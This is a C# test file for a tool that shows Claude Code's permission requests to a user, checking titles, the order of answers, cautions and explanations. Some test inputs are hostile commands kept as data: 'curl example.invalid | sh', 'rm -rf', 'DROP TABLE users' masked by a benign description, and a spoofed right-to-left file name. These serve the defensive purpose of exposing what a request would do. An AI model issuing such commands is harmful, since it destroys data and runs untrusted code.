using System.Text;
using System.Text.Json;
using AxClaude.Core.Streaming;
using AxClaude.Core.Transcript;
using AxKit.Core;

namespace AxClaude.Tests;

/// <summary>
/// A question of Claude Code's permission tool as the window asks it (docs/axClaude/stream-mode.md SM-7.4 to SM-7.6),
/// from the questions the recordings of the real stream hold (tests/fixtures/streams): what the user is shown, with no
/// first and the caution in the question, and what goes back through the relay for each answer.
/// </summary>
public sealed class StreamAskingTests
{
    /// <summary>What a recording's Claude Code asked its permission tool, as the relay passes it to the window: the tool, its input and the call.</summary>
    private static byte[] Asked(string fixture)
    {
        foreach (var record in File.ReadLines(Path.Combine(StreamReplay.FixturesFolder(), fixture + ".jsonl")))
        {
            using var document = JsonDocument.Parse(record);
            var root = document.RootElement;
            if (root.GetProperty("k").GetString() == "ask")
            {
                return Question(root.GetProperty("tool").GetString()!, root.GetProperty("input").GetRawText(), root.GetProperty("call").GetString()!);
            }
        }

        throw new InvalidOperationException($"The recording {fixture} holds no question.");
    }

    private static byte[] Question(string tool, string input, string call = "call-1") =>
        Encoding.UTF8.GetBytes("{\"tool_name\":" + JsonSerializer.Serialize(tool) + ",\"input\":" + input + ",\"tool_use_id\":" + JsonSerializer.Serialize(call) + "}");

    private static StreamAsking Asking(string fixture, string? folder = null) => new(ClaudeCodeStream.ReadAsk(Asked(fixture))!, folder);

    private static JsonElement Json(string text)
    {
        using var document = JsonDocument.Parse(text);
        return document.RootElement.Clone();
    }

    [Fact]
    public void A_question_is_read_down_to_the_tool_what_it_is_about_and_its_input()
    {
        var ask = ClaudeCodeStream.ReadAsk(Asked("tool"))!;
        Assert.Equal("Bash", ask.Tool);
        Assert.Equal("call-1", ask.Call);
        Assert.Equal("ping -n 2 127.0.0.1", ask.About);
        Assert.False(ask.IsQuestion);
        Assert.Empty(ask.Questions);
        Assert.Equal("Ping localhost twice", ask.Input.GetProperty("description").GetString());

        var own = ClaudeCodeStream.ReadAsk(Asked("two-questions"))!;
        Assert.True(own.IsQuestion);
        Assert.Equal(["What is your favourite colour?", "Which fruits do you like?"], own.Questions.Select(question => question.Text));
        Assert.Equal([false, true], own.Questions.Select(question => question.Several));
        Assert.Equal(["Apple", "Banana", "Cherry"], own.Questions[1].Choices.Select(choice => choice.Label));
    }

    [Theory]
    [InlineData("not json")]
    [InlineData("[1,2]")]
    [InlineData("{\"input\":{}}")]
    [InlineData("{\"tool_name\":\"\",\"input\":{}}")]
    public void What_is_no_question_is_read_as_none(string text)
    {
        Assert.Null(ClaudeCodeStream.ReadAsk(Encoding.UTF8.GetBytes(text)));
    }

    [Fact]
    public void A_question_tool_without_questions_is_asked_as_any_tool_call()
    {
        var ask = ClaudeCodeStream.ReadAsk(Question(ClaudeCodeStream.QuestionTool, "{}"))!;
        Assert.False(ask.IsQuestion);
        Assert.Equal("Claude asks to use AskUserQuestion", new StreamAsking(ask).Current.Title);

        // An input that is no object is an empty one: the call is still asked about.
        Assert.Equal(JsonValueKind.Object, ClaudeCodeStream.ReadAsk(Question("Bash", "\"text\""))!.Input.ValueKind);
    }

    [Fact]
    public void A_tool_call_is_asked_with_no_first_and_the_caution_heard_with_the_question()
    {
        var question = Asking("tool").Current;

        // Who asks and for what, in the title; the caution every time the question is read (bundle rule 11).
        Assert.Equal("Claude asks to use Bash: ping -n 2 127.0.0.1", question.Title);
        Assert.Equal([AiCaution.Asked("Claude")], question.Text);
        Assert.Equal(
            ["1. No", "2. No, and tell Claude why", "3. Yes, once", "4. Yes, and do not ask again for Bash in this session", "5. Explain what Claude asks to do"],
            question.Options.Select(option => $"{option.Key}. {option.Text}"));

        // Running is never where a list starts: no is first, and no answer is marked as the current one.
        Assert.Equal(StreamAsking.RefuseKey, question.Options[0].Key);
        Assert.DoesNotContain(question.Options, option => option.Current);
        Assert.False(question.AllowsSeveral);
        Assert.Null(question.Step);
    }

    [Fact]
    public void A_tool_calls_question_has_its_tool_and_target_as_its_core()
    {
        // Every answer's label carries it in the control area (SPEC.md D33): a file by its name, a command by its
        // first words. The keys of the answers, which are what goes back, stay as they are.
        Assert.Equal("Write always-1.txt", Asking("always").Current.Core);
        Assert.Equal("Write always-1.txt", Asking("always", @"C:\work").Current.Core);
        Assert.Equal("Bash ping -n 2", Asking("tool").Current.Core);
        Assert.Equal(["1", "2", "3", "4", "5"], Asking("tool").Current.Options.Select(option => option.Key));

        // Claude's own description of a call is no target; Claude's own questions have no core.
        var described = new StreamAsking(ClaudeCodeStream.ReadAsk(Question("Agent", "{\"description\":\"Look around\"}"))!);
        Assert.Equal("Agent", described.Current.Core);
        Assert.Null(Asking("two-questions").Current.Core);
    }

    [Fact]
    public void A_file_in_the_folder_Claude_works_in_is_named_from_there()
    {
        Assert.Equal(@"Claude asks to use Write: C:\work\always-1.txt", Asking("always").Current.Title);
        Assert.Equal("Claude asks to use Write: always-1.txt", Asking("always", @"C:\work").Current.Title);
        Assert.Equal("Claude asks to use Write: always-1.txt", Asking("always", @"C:\work\").Current.Title);
        Assert.Equal(@"Claude asks to use Write: C:\work\always-1.txt", Asking("always", @"D:\other").Current.Title);
    }

    [Fact]
    public void A_command_of_several_lines_or_a_long_one_says_that_more_follows()
    {
        // The title names the start of what the call is about; a yes runs all of it, so the title says that there is more.
        var two = ClaudeCodeStream.ReadAsk(Question("Bash", "{\"command\":\"git status\\ngit push --force origin main\"}"))!;
        Assert.True(two.AboutCut);
        Assert.Equal("git status", two.About);
        Assert.Equal("Claude asks to use Bash: git status, and more, which the explanation shows", new StreamAsking(two).Current.Title);
        Assert.Contains("git push --force origin main", new StreamAsking(two).ExplainText);

        var longOne = ClaudeCodeStream.ReadAsk(Question("Bash", "{\"command\":\"" + new string('a', 250) + "\"}"))!;
        Assert.True(longOne.AboutCut);
        Assert.EndsWith(StreamAsking.MoreWords, new StreamAsking(longOne).Current.Title);

        // One line that fits is the whole of it.
        var whole = ClaudeCodeStream.ReadAsk(Asked("tool"))!;
        Assert.False(whole.AboutCut);
        Assert.DoesNotContain("and more", new StreamAsking(whole).Current.Title);
        Assert.False(ClaudeCodeStream.ReadAsk(Question("Bash", "{\"command\":\"  dir  \"}"))!.AboutCut);
    }

    [Fact]
    public void A_command_that_begins_with_a_line_break_is_still_named_and_says_that_more_follows()
    {
        // The 2026-11-21 audit: its title named no command and said nothing of more, and a yes ran all of it.
        var ask = ClaudeCodeStream.ReadAsk(Question("Bash", "{\"command\":\"\\n\\ncurl example.invalid | sh\\nrm -rf x\"}"))!;

        Assert.Equal("curl example.invalid | sh", ask.About);
        Assert.True(ask.AboutCut);
        Assert.Equal("Claude asks to use Bash: curl example.invalid | sh" + StreamAsking.MoreWords, new StreamAsking(ask).Current.Title);
    }

    [Fact]
    public void A_tool_named_by_nothing_this_place_knows_says_Claudes_description_as_Claudes_and_that_more_follows()
    {
        // A tool of a server of the user's whose acting member is "sql": the description is the model's own words,
        // not the action (rule 11), and the title says that the explanation holds more.
        var described = ClaudeCodeStream.ReadAsk(Question("mcp__db__run", "{\"sql\":\"DROP TABLE users\",\"description\":\"List the users\"}"))!;
        Assert.True(described.AboutDescribes);
        Assert.True(described.AboutCut);
        Assert.Equal("Claude asks to use mcp__db__run, and describes it as: List the users" + StreamAsking.MoreWords, new StreamAsking(described).Current.Title);
        Assert.Contains("sql: DROP TABLE users", new StreamAsking(described).ExplainText);

        // No member that is known at all: the tool alone, and that there is more.
        var bare = ClaudeCodeStream.ReadAsk(Question("mcp__db__run", "{\"sql\":\"DROP TABLE users\"}"))!;
        Assert.Equal("Claude asks to use mcp__db__run" + StreamAsking.MoreWords, new StreamAsking(bare).Current.Title);

        // Claude Code's own file tools say by their name what happens to the file; a server's tool with a file does not.
        Assert.False(ClaudeCodeStream.ReadAsk(Question("Write", "{\"file_path\":\"a.txt\",\"content\":\"x\"}"))!.AboutCut);
        Assert.True(ClaudeCodeStream.ReadAsk(Question("mcp__fs__put", "{\"file_path\":\"a.txt\",\"content\":\"x\"}"))!.AboutCut);
        // A command with Claude's description beside it, as the recordings have it, holds nothing more.
        Assert.False(ClaudeCodeStream.ReadAsk(Question("Bash", "{\"command\":\"dir\",\"description\":\"List the folder\",\"timeout\":5000}"))!.AboutCut);
    }

    [Fact]
    public void Hidden_characters_of_what_Claude_asks_are_written_out_and_never_cut_the_text()
    {
        // A character of code 0 ends a text box's text: the explanation would stop before the part that matters.
        var ask = ClaudeCodeStream.ReadAsk(Question("Write", "{\"file_path\":\"a\\u202Etxt.exe\",\"content\":\"harmless\\u0000\\nrm -rf everything\\tnow\"}"))!;
        var asking = new StreamAsking(ask);

        Assert.DoesNotContain('\0', asking.ExplainText);
        Assert.Contains("harmless‹U+0000›", asking.ExplainText, StringComparison.Ordinal);
        Assert.Contains("rm -rf everything\tnow", asking.ExplainText, StringComparison.Ordinal);
        Assert.Contains("‹U+202E›", asking.Current.Title, StringComparison.Ordinal);
    }

    [Fact]
    public void The_answer_that_stops_the_asking_leaves_a_line_that_says_so_and_no_other_answer_does()
    {
        Assert.Equal(
            "You allowed Claude to use Bash without asking for the rest of this session. A new start of Claude Code asks again.",
            Asking("tool").StandingWords(StreamAsking.AlwaysKey));
        Assert.Null(Asking("tool").StandingWords(StreamAsking.OnceKey));
        Assert.Null(Asking("tool").StandingWords(StreamAsking.RefuseKey));
        // A question of Claude's own has no such answer: its third choice is a choice.
        Assert.Null(Asking("two-questions").StandingWords("3"));
    }

    [Fact]
    public void A_question_with_a_value_of_another_kind_is_read_as_none_and_never_thrown_on()
    {
        Assert.Null(ClaudeCodeStream.ReadAsk(Encoding.UTF8.GetBytes("{\"tool_name\":\"Bash\",\"input\":{\"command\":\"cut \\ud83d\"}}")));
        // Questions whose parts are of another kind are passed over, and the call is asked about as a tool call.
        var odd = ClaudeCodeStream.ReadAsk(Question(ClaudeCodeStream.QuestionTool, "{\"questions\":[{\"question\":7},\"text\",{\"question\":\"Which?\",\"options\":\"none\"}]}"))!;
        Assert.Single(odd.Questions);
        Assert.Empty(odd.Questions[0].Choices);
    }

    [Fact]
    public void Each_answer_to_a_tool_call_is_what_Claude_Code_takes_for_it()
    {
        var no = Json(Asking("tool").Answer(StreamAsking.RefuseKey)!);
        Assert.Equal("deny", no.GetProperty("behavior").GetString());
        Assert.Equal(ClaudeCodeStream.RefusedWords, no.GetProperty("message").GetString());

        var once = Json(Asking("tool").Answer(StreamAsking.OnceKey)!);
        Assert.Equal("allow", once.GetProperty("behavior").GetString());
        Assert.Equal("ping -n 2 127.0.0.1", once.GetProperty("updatedInput").GetProperty("command").GetString());
        Assert.False(once.TryGetProperty("updatedPermissions", out _));

        // For the rest of the session: a rule of the session's alone, for this tool.
        var always = Json(Asking("tool").Answer(StreamAsking.AlwaysKey)!);
        Assert.Equal("allow", always.GetProperty("behavior").GetString());
        var rule = always.GetProperty("updatedPermissions")[0];
        Assert.Equal("session", rule.GetProperty("destination").GetString());
        Assert.Equal("Bash", rule.GetProperty("rules")[0].GetProperty("toolName").GetString());

        foreach (var key in new[] { StreamAsking.RefuseKey, StreamAsking.OnceKey, StreamAsking.AlwaysKey })
        {
            Assert.True(AskRelay.IsAnswer(Asking("tool").Answer(key)!));
        }
    }

    /// <summary>
    /// "No, and tell Claude why" (SM-7.4, 2026-11-26): no answer yet, the window asks for the words as after Other, with
    /// the row the screen shows for them; the words go back with the refusal, which Claude reads (measured by the
    /// probe's case relay-refused-why), and leave a line in the conversation. Escape from the words goes back to the list.
    /// </summary>
    [Fact]
    public void A_no_with_words_asks_for_them_then_refuses_with_them()
    {
        var asking = Asking("tool");
        Assert.True(asking.AsksForWords(StreamAsking.RefuseWhyKey));
        Assert.False(asking.AsksForWords(StreamAsking.RefuseKey));
        Assert.Null(asking.Answer(StreamAsking.RefuseWhyKey));
        Assert.Equal(ClaudeCodeTexts.TextPromptFor(2, "No, and tell Claude why"), asking.WordsPrompt);
        Assert.Null(asking.ToldWhyLine);

        // Nothing typed is no answer; Escape goes back to the list, and the list's answers still work.
        Assert.Null(asking.Answer("  "));
        Assert.Null(asking.Escape());
        Assert.Null(asking.WordsPrompt);
        Assert.Null(asking.Answer(StreamAsking.RefuseWhyKey));

        var no = Json(asking.Answer(" Use the other folder ")!);
        Assert.Equal("deny", no.GetProperty("behavior").GetString());
        Assert.Equal(ClaudeCodeStream.RefusedWithWords("Use the other folder"), no.GetProperty("message").GetString());
        Assert.StartsWith(ClaudeCodeStream.RefusedWords, no.GetProperty("message").GetString(), StringComparison.Ordinal);
        Assert.Null(asking.WordsPrompt);
        Assert.Equal("You refused Claude's use of Bash and told Claude: Use the other folder", asking.ToldWhyLine);
        Assert.Null(asking.StandingWords(StreamAsking.RefuseWhyKey));

        // A question of Claude's own has no such answer: its second choice is a choice.
        Assert.False(Asking("two-questions").AsksForWords("2"));
    }

    [Fact]
    public void The_explaining_answer_answers_nothing_and_its_text_begins_with_the_caution()
    {
        var asking = Asking("tool");
        Assert.True(asking.Explains(StreamAsking.ExplainKey));
        Assert.True(asking.Explains(" 5 "));
        Assert.False(asking.Explains(StreamAsking.OnceKey));
        Assert.Null(asking.Answer(StreamAsking.ExplainKey));
        Assert.Null(asking.Answer("9"));
        Assert.Null(asking.Answer(string.Empty));

        Assert.Equal("What Claude asks to do", asking.ExplainTitle);
        var lines = asking.ExplainText.Split('\n');
        Assert.Equal(AiCaution.ToolCall("Claude"), lines[0]);
        Assert.Equal(string.Empty, lines[1]);
        Assert.Equal(["Tool: Bash", "command: ping -n 2 127.0.0.1", "description: Ping localhost twice"], lines[2..]);
    }

    [Fact]
    public void The_caution_of_a_tool_call_says_who_asks_that_it_can_be_wrong_that_nothing_is_checked_and_whose_act_it_is()
    {
        // Bundle rule 11 (docs/axKit/SPEC.md AX-11.12): the four things every such place says, in the one place of the words.
        var caution = AiCaution.ToolCall("Claude");
        Assert.StartsWith("Claude, an AI model, asks to do this", caution);
        Assert.Contains("It can be wrong", caution);
        Assert.Contains("axKit has checked none of it", caution);
        Assert.Contains("Allowing it is your own act", caution);
        Assert.Contains("If you do not understand what it does, do not allow it.", caution);
    }

    [Fact]
    public void A_text_of_several_lines_stands_on_lines_of_its_own_in_the_explanation()
    {
        var ask = ClaudeCodeStream.ReadAsk(Question("Write", "{\"file_path\":\"C:\\\\work\\\\a.txt\",\"content\":\"first\\r\\nsecond\\nthird\",\"count\":3}"))!;
        var lines = new StreamAsking(ask).ExplainText.Split('\n');
        Assert.Equal(["Tool: Write", @"file_path: C:\work\a.txt", "content:", "first", "second", "third", "count: 3"], lines[2..]);
    }

    [Fact]
    public void Escape_refuses_a_tool_call()
    {
        var no = Json(Asking("tool").Escape()!);
        Assert.Equal("deny", no.GetProperty("behavior").GetString());
        Assert.Equal(Json(StreamAsking.Refusal()).GetProperty("message").GetString(), no.GetProperty("message").GetString());
    }

    [Fact]
    public void Claudes_own_questions_are_asked_one_after_another_and_answered_as_a_whole()
    {
        var asking = Asking("two-questions");

        var first = asking.Current;
        Assert.Equal("What is your favourite colour?", first.Title);
        Assert.Empty(first.Text);
        Assert.Equal((1, 2), first.Step);
        Assert.False(first.AllowsSeveral);
        // A choice whose description only repeats its name is shown by its name; Other is last.
        Assert.Equal(["1. Red", "2. Green", "3. Blue", "4. Other"], first.Options.Select(option => $"{option.Key}. {option.Text}"));

        Assert.Null(asking.Answer("2"));
        var second = asking.Current;
        Assert.Equal("Which fruits do you like?", second.Title);
        Assert.Equal((2, 2), second.Step);
        Assert.True(second.AllowsSeveral);
        Assert.Null(asking.WordsPrompt);

        var answer = Json(asking.Answer("1,3")!);
        Assert.Equal("allow", answer.GetProperty("behavior").GetString());
        var answers = answer.GetProperty("updatedInput").GetProperty("answers");
        Assert.Equal("Green", answers.GetProperty("What is your favourite colour?").GetString());
        Assert.Equal("Apple, Cherry", answers.GetProperty("Which fruits do you like?").GetString());
        // The questions go back as they were asked.
        Assert.Equal(2, answer.GetProperty("updatedInput").GetProperty("questions").GetArrayLength());
    }

    [Fact]
    public void Claudes_own_questions_answered_as_a_whole_leave_the_record_the_screen_prints()
    {
        // stream-mode.md SM-7.5: the record Claude Code's screen prints in the answered question's place, its label and
        // a row for each question, so that the conversation keeps the answer as with the screen.
        var asking = Asking("two-questions");
        Assert.Empty(asking.AnswerRecord);
        Assert.Null(asking.Answer("2"));
        Assert.Empty(asking.AnswerRecord);
        Assert.NotNull(asking.Answer("1,3"));

        Assert.Equal(
            [ClaudeCodeTexts.AnsweredLabelText, "· What is your favourite colour? → Green", "· Which fruits do you like? → Apple, Cherry"],
            asking.AnswerRecord);
        // The screen's model knows the label and the rows by the same words.
        Assert.Matches(ClaudeCodeTexts.AnsweredLabel(), asking.AnswerRecord[0]);
        Assert.All(asking.AnswerRecord.Skip(1), row => Assert.StartsWith(ClaudeCodeTexts.AnsweredRowStart, row));

        // The user's own words are the answer's.
        var own = Asking("question");
        Assert.Null(own.Answer("3"));
        Assert.NotNull(own.Answer("tulip"));
        Assert.Equal("· Which colour do you prefer? → tulip", own.AnswerRecord[^1]);

        // A refusal answers nothing, and a tool call leaves no such record.
        var refused = Asking("question");
        Assert.NotNull(refused.Escape());
        Assert.Empty(refused.AnswerRecord);
        var tool = Asking("tool");
        Assert.NotNull(tool.Answer(StreamAsking.OnceKey));
        Assert.Empty(tool.AnswerRecord);
    }

    [Fact]
    public void A_choice_that_says_more_than_its_name_shows_Claudes_word_after_the_dash()
    {
        var question = Asking("question").Current;
        Assert.Equal("Which colour do you prefer?", question.Title);
        Assert.Null(question.Step);
        Assert.Equal(["1. Red — Choose red", "2. Blue — Choose blue", "3. Other"], question.Options.Select(option => $"{option.Key}. {option.Text}"));
    }

    [Fact]
    public void Other_asks_for_the_users_own_words_and_Escape_goes_back_to_the_list()
    {
        var asking = Asking("two-questions");

        Assert.Null(asking.Answer("4"));
        // The row Claude Code's screen shows for it, so that the window names the answer as it does with the screen.
        Assert.Equal("Enter text for option 4 (Other), or Escape for the list:", asking.WordsPrompt);
        Assert.Equal("Other", LineClassifier.TextPromptAnswer(asking.WordsPrompt!));
        Assert.Equal("What is your favourite colour?", asking.Current.Title);

        // No words are no answer; Escape goes back to the same question's list and refuses nothing.
        Assert.Null(asking.Answer("   "));
        Assert.NotNull(asking.WordsPrompt);
        Assert.Null(asking.Escape());
        Assert.Null(asking.WordsPrompt);
        Assert.Equal("What is your favourite colour?", asking.Current.Title);

        Assert.Null(asking.Answer("4"));
        Assert.Null(asking.Answer("  teal  "));
        Assert.Null(asking.WordsPrompt);
        Assert.Equal("Which fruits do you like?", asking.Current.Title);

        // Several answers with Other among them: the names chosen, then the words.
        Assert.Null(asking.Answer("2, 4"));
        Assert.Equal("Enter text for option 4 (Other), or Escape for the list:", asking.WordsPrompt);
        var answers = Json(asking.Answer("figs")!).GetProperty("updatedInput").GetProperty("answers");
        Assert.Equal("teal", answers.GetProperty("What is your favourite colour?").GetString());
        Assert.Equal("Banana, figs", answers.GetProperty("Which fruits do you like?").GetString());
    }

    [Theory]
    [InlineData("")]
    [InlineData("0")]
    [InlineData("5")]
    [InlineData("x")]
    [InlineData("1,2")]
    public void What_is_no_answer_to_a_question_changes_nothing(string keys)
    {
        // The first question takes one answer of four.
        var asking = Asking("two-questions");
        Assert.Null(asking.Answer(keys));
        Assert.Null(asking.WordsPrompt);
        Assert.Equal("What is your favourite colour?", asking.Current.Title);
        Assert.False(asking.Explains("4"));
    }

    [Fact]
    public void Escape_on_a_question_of_Claudes_refuses_the_whole()
    {
        var asking = Asking("two-questions");
        Assert.Null(asking.Answer("1"));
        var no = Json(asking.Escape()!);
        Assert.Equal("deny", no.GetProperty("behavior").GetString());
    }

    /// <summary>
    /// Claude's plan for approval (SM-7.7; the fixture plan, Claude Code 2.1.332): the plan is the question's text, after
    /// the caution, which is heard with it every time (rule 11); the screen's three answers with the no that keeps
    /// planning where the list starts, then the yes that asks before each edit, then auto mode; and one that only opens
    /// the whole plan. No core: the title names no target.
    /// </summary>
    [Fact]
    public void A_plan_is_asked_with_its_text_the_caution_first_and_keep_planning_where_the_list_starts()
    {
        var asking = Asking("plan");
        var question = asking.Current;

        Assert.True(asking.IsPlan);
        Assert.Equal("Claude has a plan and asks to carry it out", question.Title);
        Assert.Equal(AiCaution.PlanAsked("Claude"), question.Text[0]);
        Assert.Equal("Plan: create plan-probe.txt", question.Text[1]);
        Assert.Contains("1. Write plan-probe.txt in the current folder with the content hi.", question.Text);
        Assert.DoesNotContain(question.Text, line => line.Trim().Length == 0 || line.StartsWith('#'));
        Assert.Equal(["1", "2", "3", "4"], question.Options.Select(option => option.Key));
        Assert.Equal([StreamAsking.KeepPlanningLabel, StreamAsking.PlanManualLabel, StreamAsking.PlanAutoLabel, "Read the whole plan"], question.Options.Select(option => option.Text));
        Assert.StartsWith("No", question.Options[0].Text);
        Assert.Null(question.Core);
    }

    /// <summary>A yes to a plan lets the call run and sets the mode the work goes on in, in the answer (measured: Claude Code's next status names it); the plan then stays in the conversation under the answer.</summary>
    [Theory]
    [InlineData(StreamAsking.PlanManualKey, "default", "You approved Claude's plan, and approve each edit yourself:")]
    [InlineData(StreamAsking.PlanAutoKey, "auto", "You approved Claude's plan, with auto mode:")]
    public void A_yes_to_a_plan_sends_its_mode_and_leaves_the_plan_on_record(string key, string mode, string record)
    {
        var asking = Asking("plan");
        Assert.Empty(asking.AnswerRecord);
        var yes = Json(asking.Answer(key)!);

        Assert.Equal("allow", yes.GetProperty("behavior").GetString());
        Assert.Contains("plan-probe.txt", yes.GetProperty("updatedInput").GetProperty("plan").GetString());
        var update = Assert.Single(yes.GetProperty("updatedPermissions").EnumerateArray());
        Assert.Equal("setMode", update.GetProperty("type").GetString());
        Assert.Equal(mode, update.GetProperty("mode").GetString());
        Assert.Equal("session", update.GetProperty("destination").GetString());
        Assert.Equal(record, asking.AnswerRecord[0]);
        Assert.Contains("Plan: create plan-probe.txt", asking.AnswerRecord);
        Assert.Null(asking.ToldWhyLine);
        // The key of a yes is no lasting yes for a tool.
        Assert.Null(asking.StandingWords(key));
    }

    /// <summary>The no that keeps planning asks for the user's words first, as the screen's does, and sends the plan back with them; Escape from the words goes back to the list.</summary>
    [Fact]
    public void Keep_planning_asks_for_words_then_sends_the_plan_back_with_them()
    {
        var asking = Asking("plan");
        Assert.True(asking.AsksForWords(StreamAsking.KeepPlanningKey));
        Assert.False(asking.AsksForWords(StreamAsking.RefuseWhyKey));
        Assert.Null(asking.Answer(StreamAsking.KeepPlanningKey));
        Assert.Equal(ClaudeCodeTexts.TextPromptFor(1, StreamAsking.KeepPlanningLabel), asking.WordsPrompt);

        Assert.Null(asking.Escape());
        Assert.Null(asking.WordsPrompt);
        Assert.Null(asking.Answer(StreamAsking.KeepPlanningKey));
        Assert.Null(asking.Answer("   "));
        var no = Json(asking.Answer("Name it plan-kept.txt")!);

        Assert.Equal("deny", no.GetProperty("behavior").GetString());
        Assert.Equal(ClaudeCodeStream.KeepPlanning("Name it plan-kept.txt"), no.GetProperty("message").GetString());
        Assert.Equal("You sent Claude's plan back to keep planning and told Claude: Name it plan-kept.txt", asking.ToldWhyLine);
        Assert.Empty(asking.AnswerRecord);
        // What Claude is told comes back as the call's result: words for Claude alone, never shown again.
        var result = ClaudeCodeStream.Read("{\"type\":\"user\",\"message\":{\"content\":[{\"type\":\"tool_result\",\"tool_use_id\":\"c\",\"is_error\":true,\"content\":" + JsonSerializer.Serialize(ClaudeCodeStream.KeepPlanning("Name it plan-kept.txt")) + "}]}}");
        Assert.Equal(string.Empty, result.Parts[0].Text);
        Assert.Equal(string.Empty, result.Parts[0].Output);
    }

    /// <summary>The answer that opens the whole plan answers nothing; its text begins with the plan's caution, then the plan as a reader reads it. Escape refuses.</summary>
    [Fact]
    public void Reading_the_whole_plan_answers_nothing_and_begins_with_the_caution()
    {
        var asking = Asking("plan");
        Assert.True(asking.Explains(StreamAsking.PlanReadKey));
        Assert.False(asking.Explains(StreamAsking.ExplainKey));
        Assert.Null(asking.Answer(StreamAsking.PlanReadKey));
        Assert.Equal("Claude's plan", asking.ExplainTitle);
        Assert.StartsWith(AiCaution.Plan("Claude") + "\n\nPlan: create plan-probe.txt", asking.ExplainText);
        Assert.Contains("2. Verify the file exists and contains hi.", asking.ExplainText);

        Assert.Equal("deny", Json(asking.Escape()!).GetProperty("behavior").GetString());
    }

    /// <summary>The plan's caution says who wrote it, that it can be wrong, that nothing is checked, what approving lets happen, and whose act it is (rule 11).</summary>
    [Fact]
    public void The_plans_caution_says_who_wrote_it_and_whose_act_approving_is()
    {
        var caution = AiCaution.Plan("Claude");
        Assert.Contains("an AI model, wrote this plan", caution);
        Assert.Contains("It can be wrong", caution);
        Assert.Contains("axKit has checked none of it", caution);
        Assert.Contains("auto mode", caution);
        Assert.Contains("your own act", caution);
        Assert.Contains("Approving lets Claude carry it out", AiCaution.PlanAsked("Claude"));
    }
}
